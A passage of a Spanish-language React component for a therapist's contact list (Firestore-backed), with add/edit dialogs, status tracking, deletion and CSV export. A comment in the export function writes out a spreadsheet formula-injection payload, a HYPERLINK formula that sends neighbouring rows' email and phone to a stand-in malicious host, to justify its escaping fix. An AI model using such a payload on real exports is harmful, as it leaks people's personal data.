'use client';

import { useCallback, useEffect, useMemo, useRef, useState, type FormEvent } from 'react';
import FichaPersona, { type Persona } from './FichaPersona';
import { ETIQUETA_TIPO, TIPOS, comoLlego, type Tipo } from '@/lib/origenes';
import { PERFILES } from '@/lib/captacion';
import css from './plataforma.module.css';

/**
 * Los contactos de Sorela, dentro de la plataforma.
 *
 * Esto sustituye a la lista de leads de mentira que traía la maqueta —Elena,
 * Rocío, Nuria— con sus estados y sus notas inventadas. Lo que se ve aquí es
 * lo que hay en Firestore, y nada más: si está vacío es que todavía no se ha
 * apuntado nadie, y eso es un dato, no un hueco que rellenar.
 *
 * El estado se guarda al pulsar y se pinta antes de que conteste el servidor.
 * Si el servidor dice que no, se deshace: para marcar veinte contactos
 * seguidos, esperar a cada respuesta es insufrible.
 *
 * La lista va separada por lo que busca cada persona, no por orden de llegada.
 * Quien deja su contacto en la portada quiere que le traten, quien lo deja en
 * formaciones quiere aprender y quien lo deja en la comunidad ya es terapeuta:
 * son tres conversaciones distintas y llamarlas igual obliga a adivinar cuál
 * toca. De dónde vino lo decide `lib/origenes.ts`, en el servidor.
 *
 * Aquí no entra solo lo que llega por la web: Sorela puede apuntar a mano a
 * quien conoce en una exposición o por teléfono, corregir un dato mal escrito
 * y borrar a quien se apuntó por error. Esos tres van por la misma ruta que la
 * lista, `app/api/contactos`, y siempre recargando después: una ficha nueva o
 * corregida tiene que verse al momento o parece que no se ha guardado.
 */

const ESTADOS = ['Nuevo', 'Contactado', 'En conversación', 'Cerrado', 'Descartado'] as const;
type Estado = (typeof ESTADOS)[number];

type Contacto = Persona & { estado: Estado; tipo: Tipo };

/* Se reutilizan los distintivos que ya tiene la plataforma en vez de inventar
   cuatro colores nuevos: el sin atender destaca, el descartado se apaga. */
const CLASE: Record<Estado, string> = {
  Nuevo: css.estadoTinta,
  Contactado: css.estadoOro,
  'En conversación': css.estadoOro,
  Cerrado: css.estadoNeutro,
  Descartado: css.estadoApagado,
};

/**
 * Qué origen se guarda según lo que la persona busque.
 *
 * El origen es «por dónde entró», y quien se apunta a mano no ha entrado por
 * ningún sitio: no hay un valor verdadero que poner. Pero de él cuelga la
 * clasificación entera —`lib/origenes.ts` decide con el origen si alguien es
 * posible clienta, posible alumna o terapeuta certificada—, así que hay que
 * elegir uno que caiga en el tipo que Sorela marque. Estos lo consiguen:
 *
 *   cita-a-mano       → empieza por «cita-»      → posible clienta
 *   formacion-a-mano  → empieza por «formacion»  → posible alumna
 *   comunidad-a-mano  → empieza por «comunidad-» → terapeuta certificada
 *   a-mano            → no encaja en nada        → sin clasificar
 *
 * El sufijo «-a-mano» no es decorativo: mirando la colección en Firestore se
 * ve de un golpe cuáles escribió ella. Y no se usa «cita-madrid», que es lo
 * que manda components/Reserva.tsx y quedaría más bonito en la ficha, porque
 * eso significa «pidió cita en Madrid» y sería mentira: esta persona no ha
 * pedido nada, se la encontró en una feria.
 */
const ORIGEN_POR_TIPO: Record<Tipo, string> = {
  clienta: 'cita-a-mano',
  alumna: 'formacion-a-mano',
  comunidad: 'comunidad-a-mano',
  otro: 'a-mano',
};

/**
 * Si esta ficha la escribió Sorela en vez de llegar por un formulario.
 *
 * `veces` cuenta las veces que esa persona ha dejado sus datos en la web, y a
 * los apuntados a mano se les guarda un 0 porque no lo ha hecho ninguna. Está
 * explicado entero en el POST de app/api/contactos: la marca viaja por ahí
 * porque el GET manda ese número y no manda el campo `aMano`, que es el que
 * de verdad lo dice.
 */
const apuntadoAMano = (c: Contacto) => c.veces === 0;

/** «hace 3 h», «ayer», «12 oct». Una fecha completa no dice nada de un vistazo. */
function cuando(iso: string | null): string {
  if (!iso) return '';
  const d = new Date(iso);
  const min = Math.round((Date.now() - d.getTime()) / 60000);
  if (min < 1) return 'ahora mismo';
  if (min < 60) return `hace ${min} min`;
  const h = Math.round(min / 60);
  if (h < 24) return `hace ${h} h`;
  const dias = Math.round(h / 24);
  if (dias === 1) return 'ayer';
  if (dias < 7) return `hace ${dias} días`;
  return d.toLocaleDateString('es-ES', { day: 'numeric', month: 'short' });
}

/* ==========================================================================
   Apuntar y corregir un contacto
   ========================================================================== */

/** Lo que se está escribiendo en el formulario, antes de mandarlo. */
type Borrador = {
  nombre: string;
  correo: string;
  whatsapp: string;
  ciudad: string;
  perfil: string;
  nota: string;
  busca: Tipo;
};

const BORRADOR_VACIO: Borrador = {
  nombre: '',
  correo: '',
  whatsapp: '',
  ciudad: '',
  perfil: '',
  nota: '',
  /* Nace «sin clasificar» a propósito, y no en «posible clienta»: si Sorela no
     toca el selector, lo honrado es que quede el hueco y no una etiqueta que
     nadie ha elegido. Es la misma idea que explica lib/origenes.ts. */
  busca: 'otro',
};

/** Qué está haciendo el panel: apuntar a alguien nuevo o corregir a alguien. */
type Modo = { que: 'nuevo' } | { que: 'editar'; contacto: Contacto };

/** Lo que contesta el guardado, para que el panel sepa qué pintar. */
type Resultado =
  | { ok: true }
  | { ok: false; errores: Record<string, string>; fallo?: string; duplicado?: string };

/**
 * El panel de apuntar o corregir.
 *
 * Va en un <dialog> con showModal() y no desplegado dentro de la pantalla, y
 * por dos motivos. El primero es dónde cae: la lista puede tener cientos de
 * filas con los filtros puestos, así que un formulario al final —como el de la
 * agenda— quedaría a un scroll larguísimo justo cuando hace falta, que es con
 * el móvil en la oreja y la persona al otro lado dictando su correo. El
 * segundo es que apuntar a alguien no es repasar la lista: es una sola cosa,
 * de principio a fin, y el modal trae hecho lo que eso pide —el foco dentro,
 * el fondo inerte, Escape para salir— sin pelearse con los z-index del cajón
 * de móvil del panel. Es el mismo trato que ya recibe la ficha de una persona
 * en FichaPersona.tsx, y reutiliza sus estilos tal cual.
 *
 * El panel no habla con el servidor: monta el cuerpo y avisa hacia arriba.
 * Quien tiene la lista es quien sabe recargarla.
 */
function PanelContacto({
  modo,
  onCerrar,
  onGuardar,
  onVerFicha,
}: {
  modo: Modo;
  onCerrar: () => void;
  onGuardar: (cuerpo: Record<string, unknown>) => Promise<Resultado>;
  /** Abre la ficha de quien ya estaba apuntada. Devuelve si se ha podido. */
  onVerFicha: (id: string) => boolean;
}) {
  const ref = useRef<HTMLDialogElement>(null);
  /* Dónde empezó el gesto del ratón, para no confundir «soltar el botón sobre
     el velo» con «pulsar el velo». Igual que en FichaPersona. */
  const empezoEnVelo = useRef(false);

  const editando = modo.que === 'editar';

  const [borrador, setBorrador] = useState<Borrador>(() =>
    modo.que === 'editar'
      ? {
          nombre: modo.contacto.nombre,
          correo: modo.contacto.correo,
          whatsapp: modo.contacto.whatsapp,
          ciudad: modo.contacto.ciudad,
          perfil: modo.contacto.perfil,
          nota: modo.contacto.nota,
          // Sí se edita, y el origen no se toca: viaja como `tipo` y el
          // servidor lo guarda aparte. De dónde entró es un hecho que ya pasó;
          // lo que puede estar mal es la lectura que se hizo de ese hecho.
          busca: modo.contacto.tipo,
        }
      : BORRADOR_VACIO
  );
  /* Con qué empezó, para saber al cerrar si hay algo escrito que se perdería.
     Se guarda en una ref y no en un estado porque no repinta nada. */
  const inicial = useRef(borrador);

  const [errores, setErrores] = useState<Record<string, string>>({});
  const [fallo, setFallo] = useState<string | null>(null);
  /* El id de quien ya ocupaba ese correo o ese móvil, para poder abrir su
     ficha desde el propio error en vez de mandar a buscarla a mano. */
  const [duplicado, setDuplicado] = useState<string | null>(null);
  /* Si la ficha de esa duplicada no aparece en la lista cargada. Pasa cuando
     la lista viene recortada por el tope del servidor: existe, pero no ha
     llegado, y el botón de abrirla no tendría a quién abrir. */
  const [duplicadaLejos, setDuplicadaLejos] = useState(false);
  const [guardando, setGuardando] = useState(false);

  /* Este panel se monta y se desmuestra entero con cada apertura —la lista lo
     pinta solo cuando hay modo, y con una `key` distinta por contacto—, así
     que los efectos son de montaje y no hace falta seguir a ninguna prop. */
  useEffect(() => {
    const dialogo = ref.current;
    if (!dialogo) return;
    if (!dialogo.open) dialogo.showModal();
    // Al desmontarse se cierra antes, para dejar limpia la capa superior del
    // navegador en vez de fiarlo todo a que el nodo desaparezca.
    return () => {
      if (dialogo.open) dialogo.close();
    };
  }, []);

  /* La lista de detrás no debe poder moverse mientras esto está abierto: en
     móvil, al arrastrar dentro del formulario se desplazaría y se perdería el
     sitio donde estabas. */
  useEffect(() => {
    const previo = document.body.style.overflow;
    document.body.style.overflow = 'hidden';
    return () => {
      document.body.style.overflow = previo;
    };
  }, []);

  /* Solo para los campos de texto. «Qué busca» se queda fuera a propósito: es
     de un tipo cerrado y colarle una cadena cualquiera por aquí se escaparía
     sin que TypeScript dijera nada. */
  const cambiar = (campo: Exclude<keyof Borrador, 'busca'>, valor: string) =>
    setBorrador((b) => ({ ...b, [campo]: valor }));

  /**
   * Cerrar, pero no a traición.
   *
   * Lo escrito aquí no existe en ningún otro sitio: al cerrar se desmonta con
   * el panel. Se compara con lo que había al abrir en vez de mirar si los
   * campos están vacíos, porque al corregir vienen llenos desde el principio y
   * si no, preguntaría siempre. Se pregunta igual que al cerrar una ficha con
   * una nota a medias.
   */
  function intentarCerrar() {
    const tocado = (Object.keys(borrador) as (keyof Borrador)[]).some(
      (k) => borrador[k] !== inicial.current[k]
    );
    if (tocado && !window.confirm('Tienes cambios sin guardar. Si cierras se pierden. ¿Cierro?')) {
      return;
    }
    onCerrar();
  }

  async function enviar(e: FormEvent) {
    e.preventDefault();
    if (guardando) return;
    setGuardando(true);
    setErrores({});
    setFallo(null);
    setDuplicado(null);

    /* Al corregir no viajan ni el correo ni el origen: el correo es el
       identificador del documento y cambiarlo dejaría atrás el seguimiento
       entero, y el origen es de dónde entró, que no cambia. Lo explica el
       PATCH de app/api/contactos. */
    const cuerpo: Record<string, unknown> = {
      nombre: borrador.nombre,
      whatsapp: borrador.whatsapp,
      ciudad: borrador.ciudad,
      perfil: borrador.perfil,
      nota: borrador.nota,
      /*
       * Al dar de alta, «qué busca» se traduce a un origen: es lo único que
       * hay, porque esa persona no ha entrado por ningún sitio.
       *
       * Al corregir viaja como `tipo`, y el servidor lo guarda aparte sin
       * tocar el origen: de dónde entró es un hecho que ya pasó, y lo que
       * puede estar mal es la lectura que se hizo de ese hecho.
       */
      ...(editando
        ? { tipo: borrador.busca }
        : { correo: borrador.correo, origen: ORIGEN_POR_TIPO[borrador.busca] }),
    };

    const res = await onGuardar(cuerpo);
    // Si ha ido bien, la lista cierra el panel y lo desmonta: no hay nada que
    // repintar aquí, y tocar el estado de lo que ya no está no sirve de nada.
    if (res.ok) return;

    setErrores(res.errores);
    setFallo(res.fallo ?? null);
    setDuplicado(res.duplicado ?? null);
    setDuplicadaLejos(false);
    setGuardando(false);
  }

  /** El fallo de un campo, debajo de él y con su nombre. */
  function error(campo: string) {
    if (!errores[campo]) return null;
    return (
      <span className={css.errorCampo} role="alert">
        {errores[campo]}
      </span>
    );
  }

  return (
    <dialog
      ref={ref}
      className={css.fichaPanel}
      aria-label={editando ? 'Corregir los datos del contacto' : 'Apuntar un contacto nuevo'}
      // Escape cierra por su cuenta sin pasar por React. Se corta siempre y se
      // decide aquí: si hay algo escrito, intentarCerrar() pregunta, y al
      // decir que no el preventDefault es lo que lo deja abierto.
      onCancel={(e) => {
        e.preventDefault();
        intentarCerrar();
      }}
      onPointerDown={(e) => {
        empezoEnVelo.current = e.target === ref.current;
      }}
      // Se exige que el gesto empezara Y acabara fuera: al arrastrar para
      // seleccionar el texto de un campo, el «click» cae sobre el velo y sin
      // esta comprobación se cerraría el formulario a medio escribir.
      onClick={(e) => {
        if (e.target === ref.current && empezoEnVelo.current) intentarCerrar();
      }}
    >
      <div className={css.fichaCaja}>
        <button
          type="button"
          className={css.fichaCerrar}
          onClick={intentarCerrar}
          aria-label="Cerrar el formulario"
        >
          <svg width="14" height="14" viewBox="0 0 15 15" aria-hidden="true">
            <path
              d="M1 1l13 13M14 1L1 14"
              stroke="currentColor"
              strokeWidth="1.3"
              fill="none"
              strokeLinecap="round"
            />
          </svg>
        </button>

        <form onSubmit={enviar} className={css.columna} style={{ gap: 16 }}>
          <header style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
            <p className={css.rotuloSeccion}>{editando ? 'Corregir' : 'Apuntar a mano'}</p>
            <h2 className={css.h3}>
              {editando ? modo.contacto.nombre || 'Sin nombre' : 'Un contacto nuevo'}
            </h2>
            <p className={css.parrafo}>
              {editando
                ? 'Lo que corrijas aquí se queda en su ficha. Lo que tengas apuntado de sus conversaciones no se toca.'
                : 'Para quien conozcas fuera de la web: en una exposición, por teléfono o porque te lo han presentado. Entra en la misma lista que los demás.'}
            </p>
            {/* Se dice antes de escribir nada, no después de pulsar: esto manda
                un correo a una persona de verdad y no se puede deshacer. */}
            {!editando && (
              <p className={css.apunte}>
                Al guardarlo le llega por correo la información de la Técnica Divine con el PDF,
                el mismo que reciben quienes la piden desde la web. Si lo apuntas solo con el
                móvil, no se le manda nada.
              </p>
            )}
          </header>

          {fallo && (
            <p className={css.avisoFallo} role="alert">
              {fallo}
            </p>
          )}

          {/* La salida cuando ese correo o ese móvil ya eran de alguien: se le
              abre su ficha en vez de dejarla buscándola a mano por la lista. El
              botón va aquí y no pegado al campo que ha chocado porque un botón
              dentro de un <label> activa además el campo al pulsarlo. */}
          {duplicado && (
            <p className={css.avisoFallo}>
              Esa persona ya estaba apuntada.{' '}
              <button
                type="button"
                className={css.btnLinea}
                onClick={() => setDuplicadaLejos(!onVerFicha(duplicado))}
              >
                Abrir su ficha
              </button>
              {duplicadaLejos && (
                <span style={{ display: 'block', marginTop: 6 }}>
                  Está en la base de datos, pero no en la parte de la lista que se ha cargado.
                  Ciérrale esto y búscala por su nombre o su correo en el buscador de arriba.
                </span>
              )}
            </p>
          )}

          <label className={css.etiquetaCampo}>
            Nombre
            <input
              value={borrador.nombre}
              onChange={(e) => cambiar('nombre', e.target.value)}
              className={css.campoCaja}
              autoComplete="off"
              /* El ejemplo no lleva nombre propio a posta: un nombre de muestra
                 en un panel donde todavía no hay nadie se lee como una persona
                 que existe. */
              placeholder="Nombre y apellidos"
            />
            {error('nombre')}
          </label>

          <div className={css.formRejilla}>
            {editando ? (
              /* El correo no se puede corregir porque ES el identificador del
                 documento en Firestore. Se enseña igual, apagado, para que no
                 parezca que se ha perdido, y se dice qué hacer si está mal. */
              <div className={css.etiquetaCampo}>
                Correo
                <span className={css.fichaValor}>{modo.contacto.correo || 'No consta'}</span>
                <span className={css.errorCampo}>
                  El correo no se cambia: es con lo que se guarda su ficha. Si está mal, bórrala y
                  apúntala otra vez.
                </span>
              </div>
            ) : (
              <label className={css.etiquetaCampo}>
                Correo
                <input
                  type="email"
                  value={borrador.correo}
                  onChange={(e) => cambiar('correo', e.target.value)}
                  className={css.campoCaja}
                  autoComplete="off"
                  placeholder="nombre@correo.com"
                />
                {error('correo')}
              </label>
            )}

            <label className={css.etiquetaCampo}>
              WhatsApp
              <input
                type="tel"
                value={borrador.whatsapp}
                onChange={(e) => cambiar('whatsapp', e.target.value)}
                className={css.campoCaja}
                autoComplete="off"
                placeholder="+34 600 00 00 00"
              />
              {error('whatsapp')}
            </label>

            <label className={css.etiquetaCampo}>
              Ciudad
              <input
                value={borrador.ciudad}
                onChange={(e) => cambiar('ciudad', e.target.value)}
                className={css.campoCaja}
                autoComplete="off"
                placeholder="Dónde vive"
              />
              {error('ciudad')}
            </label>

            <label className={css.etiquetaCampo}>
              A qué se dedica
              <select
                value={borrador.perfil}
                onChange={(e) => cambiar('perfil', e.target.value)}
                className={css.campoCaja}
              >
                {/* Las mismas opciones que el formulario de la web, para que
                    los dos caminos guarden lo mismo y la lista no acabe con
                    dos maneras de decir lo mismo. */}
                <option value="">No lo sé todavía</option>
                {PERFILES.map((p) => (
                  <option key={p}>{p}</option>
                ))}
              </select>
              {error('perfil')}
            </label>

            {/* También al corregir: una clasificación mal puesta era lo único
                de la ficha que no había forma de arreglar, y la propia pantalla
                mandaba a «abrir su ficha y corregirla ahí». */}
            <label className={css.etiquetaCampo}>
              Qué busca
              <select
                value={borrador.busca}
                onChange={(e) => setBorrador((b) => ({ ...b, busca: e.target.value as Tipo }))}
                className={css.campoCaja}
              >
                {TIPOS.map((t) => (
                  <option key={t} value={t}>
                    {ETIQUETA_TIPO[t]}
                  </option>
                ))}
              </select>
            </label>
          </div>

          <p className={css.apunte}>
            Esto es lo que separa la lista en tres: a quien quiere una sesión no se le escribe
            igual que a quien quiere formarse. Si no lo sabes, déjalo sin clasificar y
            pregúntaselo.
            {editando && ' Cambiarlo aquí no toca de dónde llegó: eso se queda como está.'}
          </p>

          <label className={css.etiquetaCampo}>
            Nota
            <textarea
              rows={3}
              value={borrador.nota}
              onChange={(e) => cambiar('nota', e.target.value)}
              className={css.campoCaja}
              style={{ resize: 'vertical' }}
              placeholder="Dónde la conociste, qué te pidió…"
            />
            {error('nota')}
          </label>

          <div className={css.acciones}>
            <button type="submit" className={css.btn} disabled={guardando}>
              {guardando
                ? 'Guardando…'
                : editando
                  ? 'Guardar los cambios'
                  : 'Apuntar y mandarle la información'}
            </button>
            <button type="button" className={css.btnLinea} onClick={intentarCerrar}>
              Cancelar
            </button>
          </div>

          {!editando && (
            <p className={css.apunte}>
              Hace falta el nombre y, por lo menos, el correo o el WhatsApp. Si solo te ha dado el
              móvil, con eso vale.
            </p>
          )}
        </form>
      </div>
    </dialog>
  );
}

/* ==========================================================================
   La lista
   ========================================================================== */

export default function Contactos() {
  const [lista, setLista] = useState<Contacto[] | null>(null);
  const [fallo, setFallo] = useState<string | null>(null);
  const [aviso, setAviso] = useState<string | null>(null);
  const [filtro, setFiltro] = useState<'Todos' | Estado>('Todos');
  const [tipo, setTipo] = useState<'Todos' | Tipo>('Todos');
  const [busca, setBusca] = useState('');
  // Qué ficha está abierta. Se guarda el id y no la persona entera para que,
  // al cambiarle el estado o apuntarle algo, la ficha se repinte con lo nuevo
  // en vez de quedarse con la copia de cuando se abrió.
  const [abierta, setAbierta] = useState<string | null>(null);
  // Si el formulario está abierto y para qué. Null es que no lo está.
  const [modo, setModo] = useState<Modo | null>(null);
  /** Si el servidor ha tenido que cortar la lista por su tope. */
  const [recortada, setRecortada] = useState(false);

  /* Cada carga lleva su número de turno. Aquí se recarga desde cuatro sitios
     —al entrar, al guardar, al apuntar una nota y desde «Reintentar»—, así que
     es fácil tener dos peticiones en el aire, y no tienen por qué contestar en
     orden: si la primera llega la última, pinta una lista vieja encima de la
     nueva y nada lo delata. Solo se hace caso al último turno pedido. */
  const turno = useRef(0);

  const cargar = useCallback(async () => {
    const mio = ++turno.current;
    setFallo(null);
    try {
      const r = await fetch('/api/contactos');
      const c = await r.json().catch(() => ({ ok: false }));
      if (mio !== turno.current) return;
      if (!c.ok) {
        setFallo(
          c.motivo === 'sin-configurar'
            ? 'Falta la configuración de Firebase en el servidor.'
            : c.motivo === 'sin-permiso'
              ? 'Esta lista solo la ve Sorela.'
              : 'No he podido cargar los contactos.'
        );
        setLista([]);
        return;
      }
      setLista(c.contactos);
      setRecortada(Boolean(c.recortada));
    } catch {
      if (mio !== turno.current) return;
      setFallo('No hay conexión con el servidor.');
      setLista([]);
    }
  }, []);

  useEffect(() => {
    cargar();
  }, [cargar]);

  /**
   * Cambiar en qué punto está una persona.
   *
   * Devuelve si se ha guardado. Lo necesita la ficha: cuando el cambio se
   * lanza desde ella —que es un diálogo modal— el aviso de fallo de esta
   * pantalla queda DETRÁS del velo, inerte y sin que nadie lo vea. Con el
   * resultado en la mano, la ficha lo pinta dentro de sí misma.
   */
  async function cambiarEstado(id: string, estado: Estado): Promise<boolean> {
    /* Se guarda solo el estado anterior de ESA persona, no la lista entera.
       Restaurando la lista entera, un fallo aquí borraba de la pantalla los
       cambios que sí se habían guardado bien en otras filas mientras tanto. */
    const estadoAntes = lista?.find((c) => c.id === id)?.estado;
    setLista((l) => l?.map((c) => (c.id === id ? { ...c, estado } : c)) ?? l);
    try {
      const r = await fetch('/api/contactos', {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id, estado }),
      });
      if (!(await r.json().catch(() => ({ ok: false }))).ok) throw new Error();
      return true;
    } catch {
      // Se deshace y se avisa: dejar la pantalla diciendo «contactado» cuando
      // no se ha guardado es peor que no haber dejado pulsar.
      setLista((l) =>
        l?.map((c) => (c.id === id ? { ...c, estado: estadoAntes ?? c.estado } : c)) ?? l
      );
      setFallo('No se ha podido guardar el cambio. Vuelve a intentarlo.');
      return false;
    }
  }

  /** Apunta algo de una persona. Se recarga para que la ficha lo enseñe ya. */
  async function apuntar(id: string, texto: string) {
    const r = await fetch('/api/contactos', {
      method: 'PATCH',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ id, nota: texto }),
    });
    if (!(await r.json().catch(() => ({ ok: false }))).ok) {
      throw new Error('No se ha podido guardar la nota.');
    }
    await cargar();
  }

  /**
   * Guarda lo que venga del panel: un contacto nuevo o la corrección de uno.
   *
   * Los dos casos acaban en la misma ruta y se diferencian en el método, así
   * que se resuelven aquí juntos. Los errores de campo vuelven al panel para
   * que los pinte al lado de lo que falla; los demás, como un texto suelto.
   */
  async function guardar(cuerpo: Record<string, unknown>): Promise<Resultado> {
    if (!modo) return { ok: false, errores: {} };
    const corrigiendo = modo.que === 'editar';

    try {
      const r = await fetch('/api/contactos', {
        method: corrigiendo ? 'PATCH' : 'POST',
        headers: { 'Content-Type': 'application/json' },
        // Al corregir, lo que cambia va envuelto en `datos`: suelto en la raíz
        // chocaría con `nota`, que ahí significa «apunta esta nota de
        // seguimiento» y no «este es el texto de su ficha».
        body: JSON.stringify(corrigiendo ? { id: modo.contacto.id, datos: cuerpo } : cuerpo),
      });
      const c = await r.json().catch(() => ({ ok: false }));

      if (!c.ok) {
        const errores: Record<string, string> = c.errores ?? {};
        return {
          ok: false,
          errores,
          duplicado: c.motivo === 'ya-existe' ? c.id : undefined,
          // Si el servidor no dice qué campo falla, es que el problema no está
          // en lo escrito y hay que contarlo con palabras.
          fallo: Object.keys(errores).length ? undefined : motivoEnPalabras(c.motivo),
        };
      }

      setModo(null);
      /*
       * Al apuntar a alguien nuevo se le manda la información de la Técnica
       * Divine, con su PDF: el mismo correo que recibe quien la pide desde la
       * portada. El servidor contesta si salió, y aquí se dice, porque son dos
       * situaciones muy distintas para Sorela: si salió, esa persona ya tiene
       * la información y ella puede llamarla sabiéndolo; si no salió —porque
       * lo apuntó solo con el móvil, o porque Google falló—, tiene que
       * escribirle ella o la persona se queda esperando algo que no llega.
       */
      setAviso(
        corrigiendo
          ? 'Ficha corregida.'
          : c.correo
            ? 'Apuntado, y le acaba de salir el correo con la información y el PDF.'
            : 'Apuntado. El correo con la información NO ha salido: escríbele tú.'
      );
      await cargar();
      return { ok: true };
    } catch {
      return { ok: false, errores: {}, fallo: 'No hay conexión con el servidor.' };
    }
  }

  /**
   * Borrar a alguien de la lista.
   *
   * El botón está en la fila y no dentro de la ficha, que es donde pedía estar:
   * FichaPersona no recibe ningún aviso de borrado y añadírselo significaba
   * tocar un fichero que ahora mismo lleva otra mano. Queda anotado.
   *
   * Se pregunta antes, y la pregunta dice lo que de verdad se pierde: el
   * contacto se borra con todo su seguimiento, que es lo más caro que hay aquí.
   */
  async function borrar(c: Contacto) {
    const quien = c.nombre || 'este contacto';
    if (
      !window.confirm(
        `¿Borrar a ${quien}? Se va con él todo lo que tengas apuntado de vuestras conversaciones. No se puede deshacer.`
      )
    ) {
      return;
    }

    // Se guarda la fila y su sitio, no la lista entera: al fallar vuelve donde
    // estaba y lo demás se queda como esté, que puede haber cambiado.
    const donde = lista?.findIndex((x) => x.id === c.id) ?? -1;
    setAviso(null);
    setLista((l) => l?.filter((x) => x.id !== c.id) ?? l);
    try {
      const r = await fetch(`/api/contactos?id=${encodeURIComponent(c.id)}`, { method: 'DELETE' });
      if (!(await r.json().catch(() => ({ ok: false }))).ok) throw new Error();
      setFallo(null);
      setAviso(`${quien} ya no está en la lista.`);
    } catch {
      setLista((l) => {
        if (!l || l.some((x) => x.id === c.id)) return l;
        const vuelta = [...l];
        vuelta.splice(donde < 0 ? vuelta.length : donde, 0, c);
        return vuelta;
      });
      setFallo('No se ha podido borrar. Vuelve a intentarlo.');
    }
  }

  /** Descarga la lista tal como se ve, para abrirla en una hoja de cálculo. */
  function exportar() {
    if (!visibles.length) return;
    const cabecera = ['Fecha', 'Nombre', 'Correo', 'Teléfono', 'Ciudad', 'A qué se dedica', 'De dónde viene', 'Estado', 'Nota'];
    /*
     * Escapar un campo del CSV son DOS cosas, no una.
     *
     * La primera, las comillas dobles: se duplican, o una nota con comillas
     * parte la fila en dos al abrir el archivo.
     *
     * La segunda es la que importa de verdad. Excel y LibreOffice evalúan como
     * FÓRMULA cualquier celda que empiece por =, +, - o @, y entrecomillarla en
     * el CSV no lo impide. El texto de estos campos —nombre, ciudad, nota,
     * origen— lo escribe quien rellena el formulario de la portada, que es
     * cualquiera y sin cuenta. Alguien podía poner de nombre
     * `=HYPERLINK("https://sitio.malo/?d="&B2&C2,"Pincha aquí")`, esperar a que
     * Sorela descargara su lista, y de un clic suyo salían el correo y el
     * teléfono de las filas de al lado hacia un servidor de fuera. En
     * LibreOffice, WEBSERVICE() ni siquiera necesita el clic.
     *
     * El apóstrofo delante lo desactiva: la hoja lo lee como texto, no lo
     * enseña en la celda, y el dato se conserva entero.
     */
    const escapa = (v: string) => {
      const texto = String(v ?? '');
      const peligroso = /^[=+\-@\t\r]/.test(texto);
      return `"${(peligroso ? `'${texto}` : texto).replace(/"/g, '""')}"`;
    };
    /* La fecha, escrita como la escribiría una persona.
       Antes iba el ISO en crudo —«2026-09-23T10:12:33.000Z»—, que Excel no
       reconoce como fecha: ni se lee ni se puede ordenar por esa columna. Y va
       en hora de aquí, no en la Z, que además cae en el día anterior a partir
       de las dos de la madrugada. */
    const fecha = (iso: string | null) => {
      if (!iso) return '';
      const d = new Date(iso);
      return Number.isNaN(d.getTime())
        ? ''
        : d.toLocaleString('es-ES', {
            day: '2-digit',
            month: '2-digit',
            year: 'numeric',
            hour: '2-digit',
            minute: '2-digit',
          });
    };
    const filas = visibles.map((c) =>
      [fecha(c.creado), c.nombre, c.correo, c.whatsapp, c.ciudad, c.perfil, c.origen, c.estado, c.nota]
        .map(escapa)
        .join(',')
    );
    // El BOM del principio es lo que hace que Excel abra las tildes bien.
    const csv = '﻿' + [cabecera.map(escapa).join(','), ...filas].join('\n');
    const url = URL.createObjectURL(new Blob([csv], { type: 'text/csv;charset=utf-8' }));
    const a = document.createElement('a');
    a.href = url;
    a.download = 'contactos-divine.csv';
    a.click();
    URL.revokeObjectURL(url);
  }

  const visibles = useMemo(() => {
    const t = busca.trim().toLowerCase();
    return (lista ?? []).filter(
      (c) =>
        (filtro === 'Todos' || c.estado === filtro) &&
        (tipo === 'Todos' || c.tipo === tipo) &&
        (!t ||
          c.nombre.toLowerCase().includes(t) ||
          c.correo.toLowerCase().includes(t) ||
          c.ciudad.toLowerCase().includes(t))
    );
  }, [lista, filtro, tipo, busca]);

  const resumen = useMemo(() => {
    const l = lista ?? [];
    const ahora = Date.now();
    const de = (dias: number) =>
      l.filter((c) => c.creado && ahora - new Date(c.creado).getTime() < dias * 86400000).length;
    const porTipo = (t: Tipo) => l.filter((c) => c.tipo === t).length;
    return [
      { label: 'Sin atender', valor: String(l.filter((c) => c.estado === 'Nuevo').length), nota: 'nadie les ha escrito todavía' },
      { label: 'Posibles clientas', valor: String(porTipo('clienta')), nota: 'quieren que les trates' },
      { label: 'Posibles alumnas', valor: String(porTipo('alumna')), nota: 'quieren formarse' },
      { label: 'Esta semana', valor: String(de(7)), nota: 'han entrado en los últimos 7 días' },
    ];
  }, [lista]);

  if (lista === null) {
    return (
      <div className={css.columna}>
        <p className={css.vacioTexto}>Cargando los contactos…</p>
      </div>
    );
  }

  return (
    <div className={css.columna}>
      {/* Los contadores se calculan sobre la lista, y al fallar la carga la
          lista se queda vacía: pintarlos entonces sería enseñar cuatro ceros
          como si fueran un dato. Cuando no se ha podido leer, no se cuenta. */}
      {!fallo && (
        <div className={css.rejillaKpis}>
          {resumen.map((k) => (
            <article key={k.label} className={css.kpi}>
              <span className={css.kpiValor}>{k.valor}</span>
              <span className={css.kpiLabel}>{k.label}</span>
              <span className={css.kpiNota}>{k.nota}</span>
            </article>
          ))}
        </div>
      )}

      {/* Los contadores y el buscador trabajan sobre lo que ha llegado, no
          sobre todo lo que hay. Si viene cortado, se dice. */}
      {recortada && !fallo && (
        <p className={css.apunte} role="note">
          Se muestran los 500 contactos más recientes: los contadores y el buscador solo miran
          estos.
        </p>
      )}

      {fallo && (
        <p className={css.avisoFallo} role="alert">
          {fallo}{' '}
          <button type="button" className={css.btnLinea} onClick={cargar}>
            Reintentar
          </button>
        </p>
      )}

      {aviso && (
        <p className={css.avisoBien} role="status">
          {aviso}
        </p>
      )}

      {/* Primero se separa por lo que busca cada uno, y solo después por en
          qué punto está. Son dos cortes distintos y mezclarlos en una sola
          fila de botones hace que nadie entienda cuál está aplicado. */}
      <div className={css.chips}>
        {(['Todos', ...TIPOS] as const).map((t) => (
          <button
            key={t}
            type="button"
            onClick={() => setTipo(t)}
            aria-pressed={tipo === t}
            className={`${css.chip} ${tipo === t ? css.chipActivo : ''}`}
          >
            {t === 'Todos' ? 'Todos' : ETIQUETA_TIPO[t]}
            {t !== 'Todos' && (
              <span style={{ marginLeft: 7, opacity: 0.6 }}>
                {(lista ?? []).filter((c) => c.tipo === t).length}
              </span>
            )}
          </button>
        ))}
      </div>

      <div
        style={{
          display: 'flex',
          flexWrap: 'wrap',
          gap: 10,
          alignItems: 'center',
          justifyContent: 'space-between',
        }}
      >
        <div className={css.chips}>
          <input
            placeholder="Buscar por nombre, correo o ciudad"
            aria-label="Buscar contacto"
            className={css.campoRedondo}
